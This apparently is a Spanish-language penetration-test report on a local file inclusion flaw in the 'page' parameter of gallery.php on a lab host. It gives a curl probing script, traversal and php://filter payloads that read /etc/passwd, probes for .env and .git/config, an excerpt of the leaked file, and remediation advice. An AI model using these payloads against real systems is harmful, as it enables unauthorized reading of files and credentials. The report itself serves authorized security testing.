# Informe de Auditoría LFI

Fecha: 2026-04-27T15:49:38Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de la ruta /gallery.php.
- Mediante traversal y el wrapper php://filter fue posible leer archivos sensibles del sistema, incluyendo /etc/passwd.

Puntos clave
- URL vulnerable: http://web.dev.local:8081/gallery.php
- Parámetro vulnerable: page

Comandos y herramientas usados (ejecución en entorno Kali/Linux):
- Probes automatizados con curl (script):

  mkdir -p /tmp/lfi_scan
  TARGET="http://web.dev.local:8081/"
  params="file page include template path inc view dir filepath pagefile p f"
  for p in $params; do
    curl -s -G "$TARGET" --data-urlencode "$p=php://filter/read=convert.base64-encode/resource=/etc/passwd" -o /tmp/lfi_scan/${p}_phpfilter.txt || true
    curl -s -G "$TARGET" --data-urlencode "$p=/etc/passwd" -o /tmp/lfi_scan/${p}_raw.txt || true
    curl -s -G "$TARGET" --data-urlencode "$p=../../../../../../etc/passwd" -o /tmp/lfi_scan/${p}_trav.txt || true
  done

  # comprobación de backups comunes
  for f in ".env .htaccess .git/config config.php.bak backup.zip"; do
    curl -s -G "$TARGET" --data-urlencode "file=$f" -o /tmp/lfi_scan/file_${f//\//_}.txt || true
  done

- Búsqueda de evidencia en los ficheros descargados:
  grep -I -H "root:" /tmp/lfi_scan/*
  grep -I -H "cm9vdDo\|cGFzc3dk\|c3No" /tmp/lfi_scan/*

Payloads que permitieron confirmar y explotar la LFI
- Traversal directo:
  page=../../../../../../etc/passwd
  Resultado: el contenido de /etc/passwd se incluyó en la respuesta HTML (texto plano detectado dentro del cuerpo de la página).

- Wrapper php://filter para evadir filtros y leer contenido binario como base64:
  page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
  Resultado: respuesta con bloque base64 que, decodificado, contiene el contenido de /etc/passwd.

Evidencia (extracto):
- /etc/passwd parcial obtenido desde la aplicación integrada en la respuesta HTML:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

Impacto obtenido
- Divulgación de cuentas del sistema (lista de usuarios) mediante lectura de /etc/passwd.
- Con la lectura de archivos adicionales (e.g., /etc/shadow, claves SSH) sería posible obtener credenciales o escalar privilegios; en este análisis no se consiguió lectura de /etc/shadow ni de id_rsa, pero la vía está abierta.

Recomendaciones
1. Validar y sanear estrictamente los parámetros que seleccionan archivos; evitar incluir archivos directamente con rutas proporcionadas por el usuario.
2. Evitar el uso de include/require dinámico con input del usuario; usar un mapeo controlado (whitelist) de páginas permitidas.
3. Deshabilitar wrappers peligrosos o filtrar patrones como "php://" y secuencias de traversal ("../").
4. Aplicar principios de menor privilegio al usuario del servidor web y separar configuración sensible fuera del árbol accesible por la aplicación.

Comandos exactos ejecutados y outputs relevantes se han guardado en /tmp/lfi_scan/ en la máquina desde la que se realizaron las pruebas (archivos: gallery_results.txt, *_phpfilter.txt, *_trav.txt, etc.).

Conclusión
- Vulnerabilidad LFI confirmada en page (gallery.php). Se leyó exitosamente /etc/passwd mediante traversal y php://filter, lo que demuestra un vector explotable para exfiltración de ficheros sensibles.
- Impacto: divulgación de información sensible del sistema; capacidad potencial de escalada a RCE mediante técnicas adicionales (log poisoning, inclusion de archivos controlados).

Firma:
Auditor: laboratorio autorizado

